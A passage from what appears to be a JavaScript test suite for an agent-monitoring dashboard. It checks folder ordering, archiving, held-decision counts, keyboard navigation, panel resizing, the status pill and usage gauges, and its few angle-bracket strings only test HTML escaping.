  {id: 'r:done', name: 'Finished 5m ago', provider: 'codex', cwd: '/c/noclick', activity: {state: 'idle'}, last_active: at(5), created: at(200)},
  {id: 'r:nosig', name: 'Seen 1m ago', provider: 'codex', cwd: '/c/noclick', activity: {state: 'unknown'}, last_active: at(1), created: at(100)},
  {id: 'r:run', name: 'Running', provider: 'codex', cwd: '/c/noclick', activity: {state: 'active', since: at(30)}, last_active: clockNow, created: at(50)},
  {id: 'r:other', name: 'Elsewhere, 2m ago', provider: 'codex', cwd: '/c/harbor', activity: {state: 'idle'}, last_active: at(2), created: at(400)},
  {id: 'r:ended', name: 'Ended 3m ago', provider: 'codex', cwd: '/c/ledger', activity: {state: 'offline'}, last_active: at(3), created: at(500)},
  {id: 'r:hour', name: 'Done half an hour ago', provider: 'codex', cwd: '/c/noclick', activity: {state: 'idle'}, last_active: at(30), created: at(20)},
  {id: 'r:day', name: 'Done this morning', provider: 'codex', cwd: '/c/noclick', activity: {state: 'idle'}, last_active: at(300), created: at(10)},
];
const order = (sessions) => JSON.parse(run(`JSON.stringify(agentFolders(${JSON.stringify(sessions)}, [], ${clockNow}).groups.map((f) => [f.name, f.agents.map((a) => a.id)]))`));
const settled = [['noclick', ['r:run', 'r:nosig', 'r:done', 'r:wait', 'r:hour', 'r:day']], ['harbor', ['r:other']], ['ledger', ['r:ended']]];
assert.deepEqual(order(context.recencySessions), settled);
// An agent pausing between turns, or one starting a new turn, keeps its place: nothing flips.
const between = context.recencySessions.map((s) => s.id === 'r:run' ? {...s, activity: {state: 'idle'}, last_active: clockNow}
  : s.id === 'r:nosig' ? {...s, activity: {state: 'active', since: clockNow}, last_active: clockNow} : s);
assert.deepEqual(order(between), settled);
// Only crossing a band moves it: done eleven minutes ago, it steps behind the ones at work now.
assert.deepEqual(order(context.recencySessions.map((s) => s.id === 'r:nosig' ? {...s, last_active: at(11)} : s))[0][1],
  ['r:run', 'r:done', 'r:wait', 'r:nosig', 'r:hour', 'r:day']);
// Archived: put away until it runs again, has something open, or waits on you. Only a view.
const archivedAt = at(10);
const shelf = (changes, items = []) => {
  context.shelfSessions = context.recencySessions.map((s) => ({...s, archived: archivedAt, ...(changes[s.id] || {})}));
  context.shelfItems = items.map((i) => ({...i, lane: run('laneOf')(i)}));
  return JSON.parse(run(`JSON.stringify(agentFolders(shelfSessions, shelfItems, ${clockNow}))`));
};
let put = shelf({});
// Running, waiting on you, and anything that ran after it was archived stay; the rest are put away.
assert.deepEqual(put.groups.flatMap((f) => f.agents.map((a) => a.id)), ['r:run', 'r:nosig', 'r:done', 'r:wait', 'r:other', 'r:ended']);
assert.deepEqual(put.archived.map((f) => [f.name, f.agents.map((a) => a.id)]), [['noclick', ['r:hour', 'r:day']]]);
put = shelf({'r:nosig': {last_active: at(20)}, 'r:done': {last_active: at(25)}, 'r:other': {last_active: at(15)}});
assert.deepEqual(put.archived.map((f) => [f.name, f.agents.map((a) => a.id)]), [['harbor', ['r:other']], ['noclick', ['r:nosig', 'r:done', 'r:hour', 'r:day']]]);
assert.equal(put.archivedCount, 5);
assert.ok(!put.groups.flatMap((f) => f.agents).some((a) => ['r:nosig', 'r:done', 'r:other'].includes(a.id)));
// Something open, or a decision of yours it holds, brings it back.
put = shelf({'r:done': {last_active: at(20)}}, [item({id: 'o1', session_id: 'r:done', title: 'Check it'})]);
assert.ok(put.groups.flatMap((f) => f.agents).some((a) => a.id === 'r:done'));
assert.equal(run("archivable({open: 0, held: 0, state: 'idle'})"), true);
assert.equal(run("archivable({open: 1, held: 0, state: 'idle'})"), false);
assert.equal(run("archivable({open: 0, held: 1, state: 'offline'})"), false);
assert.equal(run("archivable({open: 0, held: 0, state: 'active'})"), false);
// The panel shows the same folders, and an agent's own page lists its items to open.
run(`savedSessions = state.sessions; state.sessions = agentSessions; listView = 'agents'`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<span class="f-headline"><h1>Agents</h1>') && html.includes('class="f-folder"') && html.includes('data-agent="c:bg"'));
assert.ok(!html.includes('data-view="needs"') && (html.match(/role="tablist"/g) || []).length === 1 && html.includes('role="tablist" aria-label="Show"')); // no way across to Needs you but the pill; its only tabs are All and Not acted on
assert.ok(html.includes('Old &lt;chat&gt;') === false && html.includes('data-agents-all>1 more, in 1 folder')); // quiet ones folded
assert.ok(!html.includes('/Users/someone'));
// Folders fold from their name, as on the dashboard, kept by a hash of the path, never the path.
assert.equal(run("folderKey('/Users/someone/code/harbor')"), run("folderKey('/Users/someone/code/harbor')"));
assert.notEqual(run("folderKey('/Users/someone/code/harbor')"), run("folderKey('/Users/someone/code/harbor', true)"));
assert.ok(html.includes(`data-agent-fold="${run("folderKey('/Users/someone/code/harbor')")}"`));
run("agentFolds.add(folderKey('/Users/someone/code/harbor'))");
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<div class="f-folder shut">') && html.includes('<span class="f-fold-n">2 agents · 1 running</span>'));
assert.ok(!html.includes('data-agent="c:bg"')); // its rows go with it
run("agentFolds.clear()");
// An agent with nothing open can be archived from its row; one running or waiting on you cannot.
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('data-archive="c:nofolder"') && !html.includes('data-archive="c:wait"') && !html.includes('data-archive="x:run"'));
assert.ok(!html.includes(' archived')); // nothing archived, so no Archived fold
// Archiving shows at once, before the server answers; the feed's later copy of it also repaints.
run(`realApi = api; api = () => new Promise(() => {}); realRender = render; render = () => {}`);
run(`archiveAgents(['c:nofolder'], true)`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(!html.includes('data-agent="c:nofolder"') && html.includes('data-archived') && html.includes('1 archived'));
// Opened, each archived agent has Restore; not f-back, the panel's card behind, which is kept hidden.
run('agentsArchived = true');
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<button class="f-restore" type="button" data-unarchive="c:nofolder">Restore</button>') && !/class="f-back"[^>]*data-unarchive/.test(html));
run('agentsArchived = false');
run(`state.sessions.find((s) => s.id === 'c:nofolder').archived = 0; api = realApi; render = realRender`);
run("agentOpen = 'c:done'");
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('data-back') && html.includes('Docs pass') && html.includes('<dt>Folder</dt><dd>harbor</dd>'));
run("agentOpen = 'c:gone'");
assert.ok(run('agentsPanelHTML(attention(), true)').includes('data-agent="c:bg"')); // a vanished agent falls back to the list
run(`state.sessions = savedSessions; listView = 'needs'; agentOpen = null`);

// Decisions agents hold. All shows a quiet count: what it has not heard, or, only once stuck,
// what it heard and never closed. Not acted on lists every agent of any age holding one.
const heldDecision = (id, sid, title, stage, stuck, ago, extra = {}) => ({...item({id, session_id: sid, title, status: 'answered', owner: 'agent', project: 'harbor', project_name: 'Harbor', answer: `Answer to ${title}`,
  followup: {stage, stuck, adoptable: false, replied: clockNow - ago, heard: stage === 'acknowledged' ? clockNow - ago + 60 : null}, ...extra}), lane: 'agents'});
context.heldItems_ = [
  heldDecision('h1', 'c:old', 'Which archive format', 'delivering', 'unheard', 3 * 86400 + 7200),
  heldDecision('h2', 'c:old', 'Backfill from 2021', 'delivering', 'unheard', 3 * 86400 + 3600),
  heldDecision('h3', 'c:old', 'Drop the <duplicates>', 'delivering', 'unheard', 3 * 86400 + 600, {handoff: true}),
  heldDecision('h4', 'c:old', 'Run it at night', 'acknowledged', 'unclosed', 4 * 86400),
  heldDecision('h5', 'c:done', 'Rounding rule', 'acknowledged', null, 5400),
  heldDecision('h6', 'x:run', 'Launch headline', 'delivering', null, 240),
  heldDecision('h7', 'c:wait', 'Retry or alert', 'acknowledged', 'unclosed', 2 * 86400, {project: 'other', project_name: 'Other'}),
  item({id: 'h8', session_id: 'c:done', title: 'Still open', status: 'open'}),
];
const heldOf = (sid) => `heldItems(heldItems_).filter((i) => i.session_id === '${sid}')`;
assert.deepEqual(JSON.parse(run(`JSON.stringify(heldBy(${heldOf('c:old')}))`)), {unheard: 3, open: 1, total: 4, stuck: true, oldest: clockNow - 4 * 86400});
assert.deepEqual(JSON.parse(run(`JSON.stringify(heldCount(${heldOf('c:old')}))`)), {n: 3, word: 'unheard', stuck: true});
assert.deepEqual(JSON.parse(run(`JSON.stringify(heldCount(${heldOf('c:wait')}))`)), {n: 1, word: 'not closed', stuck: true}); // heard a day ago, never closed
assert.equal(run(`heldCount(${heldOf('c:done')})`), null); // heard and still being worked on is normal
assert.deepEqual(JSON.parse(run(`JSON.stringify(heldCount(${heldOf('x:run')}))`)), {n: 1, word: 'unheard', stuck: false});
assert.equal(run("heldSplit({unheard: 3, open: 1})"), '3 unheard · 1 not closed');
assert.equal(run("heldSplit({unheard: 0, open: 2})"), '2 not closed');
// Not acted on: stuck first, then the most, then the longest waiting, in folders that keep their first agent's place.
const unacted = JSON.parse(run(`JSON.stringify((() => {const v = unactedAgents(agentSessions, heldItems_, ${clockNow}); return {rows: v.rows.map((r) => [r.a.id, r.o.total, r.o.stuck]), folders: v.folders.map((f) => [f.name, f.rows.map((r) => r.a.id)]), total: v.total, most: v.most?.a.id, stuck: v.stuck};})())`));
assert.deepEqual(unacted.rows, [['c:old', 4, true], ['c:wait', 1, true], ['c:done', 1, false], ['x:run', 1, false]]);
assert.deepEqual(unacted.folders, [['harbor', ['c:old', 'c:done']], ['site', ['c:wait']], ['lantern', ['x:run']]]);
assert.deepEqual([unacted.total, unacted.most, unacted.stuck], [7, 'c:old', true]);
assert.ok(run(`unactedSummary(unactedAgents(agentSessions, heldItems_, ${clockNow}))`).startsWith('7 decisions not acted on, across 4 agents. <b>Old &lt;chat&gt;</b> holds 4 of them, and last ran 3d ago.'));
// Nobody clearly heavier, nobody named.
assert.equal(run(`unactedAgents(agentSessions, heldItems_.filter((i) => i.session_id !== 'c:old'), ${clockNow}).most`), null);
assert.equal(run(`unactedSummary(unactedAgents(agentSessions, heldItems_.filter((i) => i.session_id !== 'c:old'), ${clockNow}))`), '3 decisions not acted on, across 3 agents.');
// Where each one stands, in words.
const stage = (id) => run(`heldStage(heldItems_.find((i) => i.id === '${id}'), ${clockNow})`);
assert.equal(stage('h1'), 'You decided 3d ago · <span class="bad">not heard in 3 days</span>');
assert.ok(stage('h4').endsWith('<span class="bad">heard, never closed</span>'));
assert.ok(stage('h5').endsWith('· heard, not closed yet') && stage('h6').endsWith('· not heard yet'));
assert.ok(run(`heldStage({...heldItems_[0], followup: {...heldItems_[0].followup, stuck: 'stopped'}})`).endsWith('agent stopped before hearing it</span>'));
// The panel: All carries the quiet count; Not acted on its split and share; the filter says how many.
run(`state.sessions = agentSessions; savedItems = state.items; state.items = heldItems_; model = derive(); listView = 'agents'; agentsAll = false; agentsShow = 'all'; heldSheet = null`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<button type="button" class="held-n stuck" data-held="c:wait" title="1 decision it heard a day ago and never closed"'));
assert.ok(html.includes('data-held="x:run"') && html.includes('>1 unheard</button>') && !html.includes('data-held="c:done"'));
assert.ok(html.includes('role="tab" data-agents-show="unacted" aria-selected="false" tabindex="-1">Not acted on<span class="n stuck">7</span>'));
assert.ok(html.includes('<div class="f-agent" data-agent="x:run"><button class="f-hit" type="button" aria-label="Release build"></button>')); // the row opens the agent, its count the sheet
run(`agentsShow = 'unacted'`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<p class="ag-sum">7 decisions not acted on') && html.includes('data-agent="c:old"')); // older than a day, still here
assert.ok(html.includes('>3 unheard · 1 not closed</button><span class="held-share most"><span class="held-meter" aria-hidden="true"><i style="width:57%"></i></span>holds 4 of 7</span>'));
assert.ok(html.includes('Claude Code · last ran 3d ago') && html.includes('Codex · running now'));
// The sheet: that agent's decisions, stuck and oldest first, your answer, where each stands, what you can do.
run(`heldSheet = 'c:old'`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('class="f-rows scroll" inert') && html.includes('class="ag-bar" inert')); // the list waits under it
assert.ok(html.includes('role="dialog" aria-modal="true" aria-labelledby="held-title"') && html.includes('<b id="held-title">3 unheard · 1 not closed</b><span>Old &lt;chat&gt;</span>'));
assert.deepEqual([...html.matchAll(/data-held-item="(h\d)"/g)].map((m) => m[1]), ['h4', 'h1', 'h2', 'h3']);
assert.ok(html.includes('<div class="you">You: Answer to Drop the &lt;duplicates&gt;</div>') && !html.includes('<duplicates>'));
assert.ok(html.includes('data-held-open="h1"') && html.includes('data-held-handoff="h1"') && html.includes('data-held-close="h1"'));
assert.ok(html.includes('data-tip="Offered to the next agent in Harbor">Offered to the next agent</span>') && !html.includes('data-held-handoff="h3"')); // offered already
run(`heldClosing = 'h2'; heldNote = 'Did it <by hand>'`);
html = run('agentsPanelHTML(attention(), true)');
assert.ok(html.includes('<input id="held-note" class="held-input" type="text" maxlength="2000" value="Did it &lt;by hand&gt;"') && html.includes('data-held-confirm="h2"') && !html.includes('data-held-close="h2"'));
html = run(`heldSheetHTML({id: 'c:wait', name: 'Asks you first'}, heldItems_.filter((i) => i.id === 'h7'))`);
assert.ok(!html.includes('data-held-handoff')); // nothing to hand an Other item to
html = run(`heldSheetHTML({id: 'c:old', name: 'Old'}, Array.from({length: 33}, (_, n) => ({...heldItems_[0], id: 'm' + n})))`);
assert.equal((html.match(/data-held-item=/g) || []).length, 30);
assert.ok(html.includes('…and 3 more on <button type="button" class="held-link" data-held-page="c:old">the agent\'s page</button>'));
// A sheet whose agent holds nothing any more closes itself.
run(`heldSheet = 'c:nosig'; heldClosing = 'h1'; heldStill(heldItems_)`);
assert.deepEqual([run('heldSheet'), run('heldClosing')], [null, null]);
// Tab memory keeps the list chosen and an open sheet; anything odd starts clean.
let keptAgents = run(`JSON.stringify(cleanTabs({view: 'agents', tabs: {agents: {show: 'unacted', sheet: 'c:old'}}}).tabs.agents)`);
assert.deepEqual([JSON.parse(keptAgents).show, JSON.parse(keptAgents).sheet], ['unacted', 'c:old']);
keptAgents = run(`JSON.stringify(cleanTabs({tabs: {agents: {show: '<odd>', sheet: 42}}}).tabs.agents)`);
assert.deepEqual([JSON.parse(keptAgents).show, JSON.parse(keptAgents).sheet], ['all', null]);
run(`tabState.tabs.agents = {...blankTab(), show: 'unacted', sheet: 'c:old'}; restoreTab('agents')`);
assert.deepEqual([run('agentsShow'), run('heldSheet'), run('heldClosing')], ['unacted', 'c:old', null]);
run(`restoreTab('needs')`);
assert.equal(run('heldSheet'), null); // the sheet belongs to Agents
run(`state.sessions = savedSessions; state.items = savedItems; model = derive(); listView = 'needs'; agentsShow = 'all'; heldSheet = null; heldClosing = null; heldNote = ''; tabState.tabs.agents = blankTab()`);

// Opening and closing are quick: a spring that settles in about 200ms, with no long tail.
assert.ok(run('springMs(SNAP)') >= 180 && run('springMs(SNAP)') <= 220, `snap spring lasts ${run('springMs(SNAP)')}ms`);
assert.ok(run('FOLD_MS') <= 240);
assert.ok(run('springMs({stiffness: 190, damping: 17})') > 600); // the springs left for other motion are slower

// Keys inside the open panel: arrows by default, Enter also opens, Escape also goes back.
const combo = (e) => run(`keyCombo(${JSON.stringify(e)})`);
assert.equal(combo({key: 'ArrowUp'}), 'ArrowUp');
assert.equal(combo({key: 'K', shiftKey: true}), 'k'); // a letter is itself, whatever shift does to it
assert.equal(combo({key: 'ArrowLeft', altKey: true}), 'Alt+ArrowLeft');
assert.equal(combo({key: 'Tab', shiftKey: true, metaKey: true}), 'Shift+Meta+Tab');
assert.equal(run("keyLabel('ArrowLeft')"), '←');
assert.equal(run("keyLabel('Alt+h')"), '⌥H');
const action = (key, mode) => run(`panelAction(${JSON.stringify(key)}, ${JSON.stringify(mode)})`);
assert.equal(action('ArrowUp', 'list'), 'previous');
assert.equal(action('ArrowDown', 'list'), 'next');
assert.equal(action('ArrowRight', 'list'), 'open');
assert.equal(action('Enter', 'list'), 'open'); // a default now, beside →
assert.equal(action('ArrowLeft', 'item'), 'back');
assert.equal(action('Escape', 'item'), 'back'); // a default now, beside ←
assert.equal(action('ArrowDown', 'item'), 'next');
assert.deepEqual(JSON.parse(run("JSON.stringify(cleanPanelKeys({back: 'h', open: null, next: 42}))")), {previous: ['ArrowUp'], next: ['ArrowDown'], open: ['Enter'], back: ['h', 'Escape']});
run("panelKeys = cleanPanelKeys({back: 'h'})");
assert.equal(action('h', 'item'), 'back');
assert.equal(action('ArrowLeft', 'item'), null); // rebound, so the old key does nothing
assert.equal(action('Escape', 'item'), 'back'); // it always went back, so it still does
run('panelKeys = cleanPanelKeys()');
// While typing, the arrows and Enter belong to the text, and Escape first leaves the box.
run(`floatOpen = true; customizing = false; route.item = 'a1'; stepped = []; went = [];
  realStep = step; step = (n) => stepped.push(n); realGo = go; go = (next) => went.push(next);
  keyEvent = (key, typing) => ({key, defaultPrevented: false, prevented: 0, stopped: 0, blurred: 0,
    preventDefault() {this.prevented += 1;}, stopImmediatePropagation() {this.stopped += 1;},
    target: {matches: () => typing, blur() {keyEventBlurred += 1;}}}); keyEventBlurred = 0;`);
run(`e1 = keyEvent('ArrowDown', true); panelKey(e1); e2 = keyEvent('Enter', true); panelKey(e2)`);
assert.equal(run('e1.prevented + e2.prevented + stepped.length + went.length'), 0); // caret moves, nothing else
run(`e3 = keyEvent('Escape', true); panelKey(e3)`);
assert.equal(run('keyEventBlurred'), 1);
assert.equal(run('went.length'), 0); // the first Escape only leaves the box
run(`e4 = keyEvent('Escape', false); panelKey(e4)`);
assert.deepEqual(JSON.parse(run('JSON.stringify(went)')), [{item: null}]); // the second goes back
assert.equal(run('cursor'), 'a1'); // with the item it came from highlighted
run(`e5 = keyEvent('ArrowDown', false); panelKey(e5); e6 = keyEvent('ArrowUp', false); panelKey(e6)`);
assert.deepEqual(Array.from(run('stepped')), [1, -1]); // up and down move between items in item view
run('step = realStep; go = realGo; floatOpen = false; route.item = null; cursor = null');

// Resizing: only the edges away from the pill, and both edges together where the box is centred.
const edges = (dock) => JSON.parse(run(`JSON.stringify(freeEdges('${dock}'))`));
assert.deepEqual(edges('top-left'), {x: ['right'], y: ['bottom'], centeredX: false, centeredY: false});
assert.deepEqual(edges('top-right'), {x: ['left'], y: ['bottom'], centeredX: false, centeredY: false});
assert.deepEqual(edges('bottom-left'), {x: ['right'], y: ['top'], centeredX: false, centeredY: false});
assert.deepEqual(edges('right'), {x: ['left'], y: ['top', 'bottom'], centeredX: false, centeredY: true});
assert.deepEqual(edges('bottom'), {x: ['left', 'right'], y: ['top'], centeredX: true, centeredY: false});
assert.deepEqual(edges('top'), {x: ['left', 'right'], y: ['bottom'], centeredX: true, centeredY: false});
const dhruv = {x: 0, y: 33, width: 1728, height: 994}, pillAtRight = {x: 1680, y: 480, width: 38, height: 102};
const limits = JSON.parse(run(`JSON.stringify(sizeLimits('right', 'list', ${JSON.stringify(pillAtRight)}, ${JSON.stringify(dhruv)}))`));
assert.deepEqual(limits, {min: {width: 300, height: 200}, max: {width: 1728 - 20 - 38 - 8, height: 994 - 14}});
const resize = (edge, dx, dy, dock = 'right', start = {width: 380, height: 520}) => JSON.parse(run(`JSON.stringify(resized(${JSON.stringify(start)}, '${edge}', ${dx}, ${dy}, '${dock}', ${JSON.stringify(limits)}))`));
assert.deepEqual(resize('left', -120, 0), {width: 500, height: 520}); // pulling the left edge left widens it
assert.deepEqual(resize('bottom', 0, 50), {width: 380, height: 620}); // centred on the pill, so it grows both ways
assert.deepEqual(resize('top-left', -20, -10), {width: 400, height: 540});
assert.deepEqual(resize('left', 500, 0), {width: 300, height: 520}); // never below the minimum
assert.deepEqual(resize('left', -5000, 0), {width: limits.max.width, height: 520}); // nor off the screen
assert.deepEqual(resize('right', 40, 30, 'top-left'), {width: 420, height: 520}); // a top-left box has no top edge to drag
assert.deepEqual(resize('bottom', 0, 30, 'top-left'), {width: 380, height: 550});
// The window sets the cursor the page asks for, since macOS shows a page's own cursor only
// for the active app: the right one for every edge and corner at every dock.
const kinds = {left: 'ew', right: 'ew', top: 'ns', bottom: 'ns', 'top-left': 'nwse', 'bottom-right': 'nwse', 'top-right': 'nesw', 'bottom-left': 'nesw'};
for (const dock of ['top-left', 'top', 'top-right', 'left', 'right', 'bottom-left', 'bottom', 'bottom-right']) {
  for (const edge of Array.from(run(`gripEdges('${dock}')`))) assert.equal(run(`gripCursor('${edge}')`), kinds[edge], `${dock} ${edge}`);
}
assert.deepEqual(Array.from(run("gripEdges('right')")).map((e) => run(`gripCursor('${e}')`)), ['ew', 'ns', 'ns', 'nwse', 'nesw']);
assert.deepEqual(Array.from(run("gripEdges('top-left')")), ['right', 'bottom', 'bottom-right']);
assert.deepEqual(Array.from(run("gripEdges('bottom')")), ['left', 'right', 'top', 'top-left', 'top-right']);
assert.equal(run("gripCursor('middle')"), 'default');
run(`posted = []; window = {webkit: {messageHandlers: {hq: {postMessage: (m) => posted.push(m)}}}}; cursorSent = 'default|';
  sendCursor('ew', 'left'); sendCursor('ew', 'left'); sendCursor('nwse', 'top-left'); sendCursor('default'); sendCursor('default')`);
assert.deepEqual(JSON.parse(run('JSON.stringify(posted)')), [{type: 'cursor', kind: 'ew', edge: 'left'}, {type: 'cursor', kind: 'nwse', edge: 'top-left'}, {type: 'cursor', kind: 'default', edge: ''}]); // only on change
run('delete globalThis.window; cursorSent = "default|"');
// Two monitors of one size give the pill the same local rect: moving to the twin must still be sent.
run(`posted = []; window = {webkit: {messageHandlers: {hq: {postMessage: (m) => posted.push(m)}}}}; savedPlaced = placed; savedDisplay = display;
  display = {x: 0, y: 0}; placeWindow({x: 10, y: 20, width: 40, height: 120}, {});
  display = {x: 0, y: 0}; placeWindow({x: 10, y: 20, width: 40, height: 120}, {});
  display = {x: 1920, y: 0}; placeWindow({x: 10, y: 20, width: 40, height: 120}, {})`);
assert.equal(run('posted.length'), 2); // the same place on the same display is sent once; on the twin, again
run('delete globalThis.window; placed = savedPlaced; display = savedDisplay');
// Sizes are kept per view, and anything odd in settings falls back to the default.
assert.deepEqual(JSON.parse(run("JSON.stringify(cleanSizes({list: {width: 500.4, height: 700}, item: {width: 'wide'}}))")), {list: {width: 500, height: 700}, item: null});
assert.deepEqual(JSON.parse(run("JSON.stringify(chosenSize('list', cleanSizes()))")), {width: 380, height: 520});
assert.deepEqual(JSON.parse(run("JSON.stringify(chosenSize('item', cleanSizes({item: {width: 640, height: 900}})))")), {width: 640, height: 900});

// The pill: a black capsule of circles you choose, with no wordmark.
run("circles = ['needs', 'agents', 'claude']");
html = run('pillHTML(attention(), true)');
assert.equal((html.match(/class="f-circle/g) || []).length, 3);
assert.ok(!html.includes('wordmark') && !html.includes('>HQ<'));
assert.ok(html.indexOf('data-metric="needs"') < html.indexOf('data-metric="agents"'));
assert.ok(html.includes('<span class="f-circle loud"><span>7</span></span>'));
assert.ok(html.includes('7 need you'));
run("circles = ['agents', 'needs']");
assert.ok(run('pillHTML(attention(), true)').indexOf('data-metric="agents"') < run('pillHTML(attention(), true)').indexOf('data-metric="needs"')); // your order
run("feel.style = 'outline'");
assert.ok(!run('pillHTML(attention(), true)').includes('loud'));
run("feel.style = 'attention'; circles = ['needs']");
assert.ok(!run('pillHTML([], true)').includes('loud') && run('pillHTML([], true)').includes('<span>0</span>')); // nothing to act on
assert.ok(run('pillHTML(attention(), false)').includes('dot err') && run('pillHTML(attention(), false)').includes('Reconnecting'));
assert.ok(!run('pillHTML(attention(), true)').includes('dot err'));
assert.equal(run('pillLabel(attention(), true)'), 'HQ. 7 need you.');
assert.equal(run('pillLabel(attention().slice(0, 1), true)'), 'HQ. 1 needs you.');
assert.equal(run('pillLabel([], false)'), 'HQ. 0 need you. Reconnecting.');
assert.equal(run('shortCount(144)'), '144');
assert.equal(run('shortCount(1000)'), '1k+');
assert.ok(run("circleHTML({value: 144})").includes('wide'));
assert.ok(!run("circleHTML({value: 14})").includes('wide'));

// Agents running counts only what is verifiably active.
assert.equal(run("METRICS.agents.read([]).value"), run("model.agents.filter(a => agentState(a) === 'active').length"));
run("setLive(false)");
assert.equal(run("METRICS.agents.read([]).value"), 0); // offline, so nothing is verifiably running
run("setLive(true)");

// Usage is never invented: nothing connected shows an empty circle.
run("state.usage = {claude: null}");
assert.equal(run("METRICS.claude.read([]).value"), null);
assert.equal(run("METRICS.codex.read([]).value"), null);
html = run("circleHTML(METRICS.claude.read([]))");
assert.ok(html.includes('none') && html.includes('–') && !html.includes('<svg'));
assert.ok(run("METRICS.claude.read([]).tag").includes('not connected'));
// The tightest limit is the one that will stop you.
const resets = Math.round(now + 7200);
run(`state.usage = {claude: {as_of: Date.now() / 1000, windows: [{name: 'weekly', left: 81, resets_at: null}, {name: '5-hour', left: 62, resets_at: ${resets}}]}}`);
assert.equal(run("METRICS.claude.read([]).value"), 62);
assert.ok(run("METRICS.claude.read([]).tag").startsWith("62% of Claude's 5-hour limit left, resets "));
html = run("circleHTML(METRICS.claude.read([]))");
assert.ok(html.includes('stroke-dasharray="62 100"') && html.includes('gauge') && !html.includes('low') && !html.includes('stale'));
run("state.usage.claude.windows[1].left = 5");
assert.ok(run("circleHTML(METRICS.claude.read([]))").includes('low'));
run("state.usage.claude.windows[1].left = 62; state.usage.claude.as_of = Date.now() / 1000 - 7200");
assert.ok(run("circleHTML(METRICS.claude.read([]))").includes('stale'));
assert.ok(run("METRICS.claude.read([]).tag").includes('(as of 2h ago)'));
run("state.usage = {claude: {as_of: 1, windows: [{name: 'weekly', left: 'lots'}]}}");
assert.equal(run("METRICS.claude.read([]).value"), null); // a malformed number is not a number
run("delete state.usage");
assert.equal(run("METRICS.claude.read([]).value"), null);
// A usage change alone has to repaint the pill.
run("snapshotSignature = ''");
context.queue = {...context.queue, revision: context.queue.revision + 1, usage: {codex: {as_of: 1, windows: [{name: '5-hour', left: 40}]}}};
run('applyState(queue)');
assert.ok(run('snapshotSignature').includes('"left":40'));
run("state.usage = undefined");

// Choosing circles: one always stays, order is yours, and old saved names cannot break it.
const list = (code) => Array.from(run(code));
assert.deepEqual(list("cleanCircles(['needs', 'gone-metric', 'needs', 'codex'])"), ['needs', 'codex']);
assert.deepEqual(list('cleanCircles(undefined)'), list('DEFAULT_CIRCLES'));
assert.deepEqual(list("cleanCircles('needs')"), list('DEFAULT_CIRCLES'));
assert.deepEqual(list("cleanCircles([])"), list('DEFAULT_CIRCLES'));
assert.deepEqual(list("toggleCircle(['needs'], 'agents')"), ['needs', 'agents']);
assert.deepEqual(list("toggleCircle(['needs', 'agents'], 'needs')"), ['agents']);
assert.deepEqual(list("toggleCircle(['needs'], 'needs')"), ['needs']);
assert.deepEqual(list("moveCircle(['a', 'b', 'c'], 'c', -1)"), ['a', 'c', 'b']);
assert.deepEqual(list("moveCircle(['a', 'b', 'c'], 'a', -1)"), ['a', 'b', 'c']);
assert.deepEqual(list("moveCircle(['a', 'b', 'c'], 'c', 1)"), ['a', 'b', 'c']);
assert.deepEqual(list("moveCircle(['a'], 'gone', 1)"), ['a']);
run("circles = ['agents']");
html = run('settingsHTML(attention())');
for (const metric of ['needs', 'decisions', 'due', 'agents', 'claude', 'codex']) assert.ok(html.includes(`data-circle="${metric}"`), metric);
assert.ok(html.indexOf('data-circle="agents"') < html.indexOf('data-circle="needs"')); // what you chose comes first
assert.ok(/data-circle="agents" aria-checked="true" disabled/.test(html)); // the last circle cannot be removed
assert.ok(html.includes('Not connected') && html.includes('f-preview'));
run("circles = ['agents', 'needs']");
assert.ok(!/data-circle="agents" aria-checked="true" disabled/.test(run('settingsHTML(attention())')));
run("circles = ['needs', 'agents', 'codex']");
// Labels open away from the screen edge, and only where the circles would stay put.
assert.equal(run("labelSide('top-left')"), 'right');
assert.equal(run("labelSide('bottom-right')"), 'left');
assert.equal(run("labelSide('top')"), 'none');
assert.equal(run("labelSide('top-left', 'horizontal')"), 'none');
assert.equal(run("surfaceMode(true, null, true)"), 'settings');
assert.equal(run("surfaceMode(false, null, true)"), 'pill');

// Notifications say what changed, whoever did it.
const changes = (before, after, all = []) => JSON.parse(run(`JSON.stringify(itemChanges(${JSON.stringify(before)}, ${JSON.stringify(after)}, ${JSON.stringify(all)}))`));
const plainItem = (fields) => ({id: 'x', title: 'Title <b>', project_name: 'Harbor', kind: 'todo', lane: 'you', status: 'open', ...fields});
let event = changes([], [plainItem({id: 'n', kind: 'question'})])[0];
assert.deepEqual([event.title, event.sub, event.delta, event.item, event.group], ['Title <b>', 'New decision · Harbor', 1, 'n', 'items']);
assert.equal(changes([], [plainItem({kind: 'blocker'})])[0].sub, 'New blocker · Harbor');
assert.equal(changes([], [plainItem({})])[0].sub, 'New action · Harbor');
event = changes([], [plainItem({delivery: 'failed', status: 'answered'})])[0];
assert.equal(event.sub, 'Reply failed · Harbor');
assert.equal(event.dot, 'bad');
const gone = (latest) => changes([plainItem({})], [], latest ? [plainItem(latest)] : [])[0].sub;
assert.equal(gone(null), 'Done · Harbor');
assert.equal(gone({status: 'done'}), 'Done · Harbor');
assert.equal(gone({status: 'done', skipped: true}), 'Skipped · Harbor');
assert.equal(gone({status: 'answered'}), 'Reply saved · Harbor'); // saved, never received
assert.equal(gone({lane: 'later'}), 'Snoozed · Harbor');
assert.equal(gone({asking: true}), 'Asked the agent · Harbor');
assert.equal(gone({owner: 'agent'}), 'With the agent · Harbor');
assert.equal(gone({owner: 'external'}), 'Waiting on someone · Harbor');
assert.deepEqual(changes([plainItem({})], [plainItem({})]), []); // nothing changed, nothing to say

// An agent only counts once its new state has held, and unknown never reads as stopped.
const agent = (state) => [{id: 'a', name: 'Triage', harness: 'Codex', state}];
run('tracked = new Map()');
const track = (state, t, settled = true) => JSON.parse(run(`JSON.stringify(trackAgents(tracked, ${JSON.stringify(agent(state))}, ${t}, ${settled}))`));
assert.deepEqual(track('idle', 100, false), []); // the baseline is not news
assert.deepEqual(track('active', 101), []); // it just started; wait
assert.deepEqual(track('idle', 102), []); // a flicker between turns
assert.deepEqual(track('active', 103), []);
